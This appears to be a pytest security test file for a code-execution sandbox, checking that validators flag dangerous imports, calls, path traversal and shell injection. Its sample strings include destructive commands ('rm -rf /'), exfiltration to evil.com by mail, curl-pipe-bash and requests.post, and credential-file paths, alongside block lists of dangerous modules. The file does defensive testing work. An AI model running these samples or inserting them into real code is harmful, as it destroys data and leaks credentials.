"""
Security Tests: Code Execution Sandbox Security (Task 8.5.4)

Tests to validate code execution sandbox security and prevent malicious code execution.

References:
- Requirements 6: Secure code execution with multi-layer sandbox isolation
- Design Section 5.4: Code Execution Sandbox
"""

import pytest
from unittest.mock import Mock, patch, MagicMock
import ast
import re


class TestCodeValidation:
    """Test code validation before execution."""

    def test_detect_dangerous_imports(self):
        """Test detection of dangerous imports."""
        dangerous_code = """
import os
import subprocess
os.system('rm -rf /')
"""
        
        # Parse code and check for dangerous imports
        tree = ast.parse(dangerous_code)
        dangerous_modules = {"os", "subprocess", "sys", "socket", "requests"}
        
        found_dangerous = False
        for node in ast.walk(tree):
            if isinstance(node, ast.Import):
                for alias in node.names:
                    if alias.name in dangerous_modules:
                        found_dangerous = True
        
        assert found_dangerous is True

    def test_detect_dangerous_functions(self):
        """Test detection of dangerous function calls."""
        dangerous_code = """
eval("malicious_code")
exec("more_malicious_code")
__import__('os').system('ls')
"""
        
        tree = ast.parse(dangerous_code)
        dangerous_functions = {"eval", "exec", "__import__", "compile"}
        
        found_dangerous = False
        for node in ast.walk(tree):
            if isinstance(node, ast.Call):
                if isinstance(node.func, ast.Name):
                    if node.func.id in dangerous_functions:
                        found_dangerous = True
        
        assert found_dangerous is True

    def test_detect_file_operations(self):
        """Test detection of file operations."""
        file_code = """
with open('/etc/passwd', 'r') as f:
    data = f.read()
"""
        
        tree = ast.parse(file_code)
        
        found_file_op = False
        for node in ast.walk(tree):
            if isinstance(node, ast.Call):
                if isinstance(node.func, ast.Name) and node.func.id == "open":
                    found_file_op = True
        
        assert found_file_op is True

    def test_detect_network_operations(self):
        """Test detection of network operations."""
        network_code = """
import socket
s = socket.socket()
s.connect(('evil.com', 80))
"""
        
        tree = ast.parse(network_code)
        
        # Check for socket import
        found_socket = False
        for node in ast.walk(tree):
            if isinstance(node, ast.Import):
                for alias in node.names:
                    if alias.name == "socket":
                        found_socket = True
        
        assert found_socket is True

    def test_allow_safe_code(self):
        """Test that safe code is allowed."""
        safe_code = """
def add(a, b):
    return a + b

result = add(2, 3)
print(result)
"""
        
        tree = ast.parse(safe_code)
        dangerous_modules = {"os", "subprocess", "sys", "socket"}
        dangerous_functions = {"eval", "exec", "__import__"}
        
        found_dangerous = False
        for node in ast.walk(tree):
            if isinstance(node, ast.Import):
                for alias in node.names:
                    if alias.name in dangerous_modules:
                        found_dangerous = True
            elif isinstance(node, ast.Call):
                if isinstance(node.func, ast.Name):
                    if node.func.id in dangerous_functions:
                        found_dangerous = True
        
        assert found_dangerous is False

    def test_detect_infinite_loops(self):
        """Test detection of potential infinite loops."""
        loop_code = """
while True:
    pass
"""
        
        tree = ast.parse(loop_code)
        
        found_while_true = False
        for node in ast.walk(tree):
            if isinstance(node, ast.While):
                if isinstance(node.test, ast.Constant) and node.test.value is True:
                    found_while_true = True
        
        assert found_while_true is True

    def test_detect_resource_exhaustion(self):
        """Test detection of resource exhaustion attempts."""
        exhaustion_code = """
data = []
for i in range(10**9):
    data.append(i)
"""
        
        tree = ast.parse(exhaustion_code)
        
        # Check for large range
        found_large_range = False
        for node in ast.walk(tree):
            if isinstance(node, ast.Call):
                if isinstance(node.func, ast.Name) and node.func.id == "range":
                    if node.args:
                        # Check if argument is a large number
                        found_large_range = True
        
        assert found_large_range is True


class TestSandboxExecution:
    """Test sandbox execution environment."""

    @pytest.fixture
    def mock_sandbox(self):
        """Create mock sandbox."""
        sandbox = Mock()
        sandbox.execute = Mock()
        return sandbox

    def test_execution_timeout(self, mock_sandbox):
        """Test that code execution has timeout."""
        code = "import time; time.sleep(100)"
        timeout = 5
        
        mock_sandbox.execute.return_value = {
            "status": "timeout",
            "error": "Execution exceeded timeout of 5 seconds"
        }
        
        result = mock_sandbox.execute(code, timeout=timeout)
        
        assert result["status"] == "timeout"
        mock_sandbox.execute.assert_called_once_with(code, timeout=timeout)

    def test_memory_limit_enforcement(self, mock_sandbox):
        """Test that memory limits are enforced."""
        code = "data = [0] * (10**9)"  # Try to allocate large memory
        memory_limit = "512m"
        
        mock_sandbox.execute.return_value = {
            "status": "error",
            "error": "Memory limit exceeded"
        }
        
        result = mock_sandbox.execute(code, memory_limit=memory_limit)
        
        assert result["status"] == "error"
        assert "Memory limit" in result["error"]

    def test_cpu_limit_enforcement(self, mock_sandbox):
        """Test that CPU limits are enforced."""
        code = "while True: pass"
        cpu_quota = 50000  # 50% CPU
        
        mock_sandbox.execute.return_value = {
            "status": "timeout",
            "cpu_usage": 0.5
        }
        
        result = mock_sandbox.execute(code, cpu_quota=cpu_quota)
        
        assert result["status"] == "timeout"

    def test_filesystem_restrictions(self, mock_sandbox):
        """Test that filesystem access is restricted."""
        code = "open('/etc/passwd', 'r')"
        
        mock_sandbox.execute.return_value = {
            "status": "error",
            "error": "Permission denied: /etc/passwd"
        }
        
        result = mock_sandbox.execute(code)
        
        assert result["status"] == "error"
        assert "Permission denied" in result["error"]

    def test_network_restrictions(self, mock_sandbox):
        """Test that network access is restricted."""
        code = """
import socket
s = socket.socket()
s.connect(('google.com', 80))
"""
        
        mock_sandbox.execute.return_value = {
            "status": "error",
            "error": "Network access denied"
        }
        
        result = mock_sandbox.execute(code)
        
        assert result["status"] == "error"
        assert "Network" in result["error"]

    def test_output_size_limit(self, mock_sandbox):
        """Test that output size is limited."""
        code = "print('x' * (10**7))"  # Try to print 10MB
        
        mock_sandbox.execute.return_value = {
            "status": "success",
            "output": "x" * 1000 + "... [truncated]"
        }
        
        result = mock_sandbox.execute(code)
        
        assert "[truncated]" in result["output"]

    def test_process_limit(self, mock_sandbox):
        """Test that process creation is limited."""
        code = """
import subprocess
subprocess.Popen(['ls'])
"""
        
        mock_sandbox.execute.return_value = {
            "status": "error",
            "error": "Process creation not allowed"
        }
        
        result = mock_sandbox.execute(code)
        
        assert result["status"] == "error"


class TestSandboxIsolation:
    """Test sandbox isolation from host system."""

    def test_environment_variable_isolation(self):
        """Test that sandbox doesn't have access to host environment variables."""
        # In a real sandbox, environment variables should be cleared
        # or only whitelisted variables should be available
        allowed_vars = {"PATH", "PYTHONPATH", "HOME"}
        sensitive_vars = {"AWS_SECRET_KEY", "DATABASE_PASSWORD", "API_KEY"}
        
        # Simulate checking environment variables in sandbox
        sandbox_env = {"PATH": "/usr/bin", "HOME": "/sandbox"}
        
        for var in sensitive_vars:
            assert var not in sandbox_env

    def test_user_isolation(self):
        """Test that sandbox runs as non-root user."""
        # Sandbox should run as unprivileged user
        sandbox_user = "sandbox"
        sandbox_uid = 1000
        
        assert sandbox_user != "root"
        assert sandbox_uid != 0

    def test_temporary_filesystem(self):
        """Test that sandbox uses temporary filesystem."""
        # Sandbox should have its own temporary filesystem
        # that is destroyed after execution
        sandbox_workspace = "/tmp/sandbox_12345"
        
        assert "/tmp/sandbox_" in sandbox_workspace
        assert sandbox_workspace != "/"

    def test_no_persistent_state(self):
        """Test that sandbox doesn't maintain persistent state."""
        # Each execution should start with clean state
        execution_1_id = "sandbox_001"
        execution_2_id = "sandbox_002"
        
        assert execution_1_id != execution_2_id


class TestMaliciousCodePrevention:
    """Test prevention of malicious code execution."""

    def test_prevent_code_injection(self):
        """Test prevention of code injection attacks."""
        user_input = "'; import os; os.system('rm -rf /'); '"
        
        # Code should be validated before execution
        # Check for suspicious patterns
        suspicious_patterns = [
            r"import\s+os",
            r"import\s+subprocess",
            r"__import__",
            r"eval\s*\(",
            r"exec\s*\("
        ]
        
        found_suspicious = False
        for pattern in suspicious_patterns:
            if re.search(pattern, user_input):
                found_suspicious = True
                break
        
        assert found_suspicious is True

    def test_prevent_path_traversal(self):
        """Test prevention of path traversal attacks."""
        malicious_paths = [
            "../../../etc/passwd",
            "/etc/shadow",
            "../../.ssh/id_rsa"
        ]
        
        for path in malicious_paths:
            # Path should be validated
            is_safe = not (".." in path or path.startswith("/"))
            assert is_safe is False

    def test_prevent_command_injection(self):
        """Test prevention of command injection."""
        malicious_commands = [
            "ls; rm -rf /",
            "cat /etc/passwd | mail attacker@evil.com",
            "$(curl evil.com/malware.sh | bash)"
        ]
        
        for cmd in malicious_commands:
            # Check for command injection patterns
            dangerous_chars = [";", "|", "&", "$", "`"]
            found_dangerous = any(char in cmd for char in dangerous_chars)
            assert found_dangerous is True

    def test_prevent_privilege_escalation(self):
        """Test prevention of privilege escalation."""
        escalation_attempts = [
            "sudo su",
            "chmod +s /bin/bash",
            "setuid(0)"
        ]
        
        for attempt in escalation_attempts:
            # These should be blocked
            dangerous_keywords = ["sudo", "su", "setuid", "chmod +s"]
            found_dangerous = any(kw in attempt for kw in dangerous_keywords)
            assert found_dangerous is True

    def test_prevent_data_exfiltration(self):
        """Test prevention of data exfiltration."""
        exfiltration_code = """
import requests
data = open('/etc/passwd').read()
requests.post('http://evil.com', data=data)
"""
        
        tree = ast.parse(exfiltration_code)
        
        # Check for network operations
        found_network = False
        for node in ast.walk(tree):
            if isinstance(node, ast.Import):
                for alias in node.names:
                    if alias.name in ["requests", "urllib", "socket"]:
                        found_network = True
        
        assert found_network is True
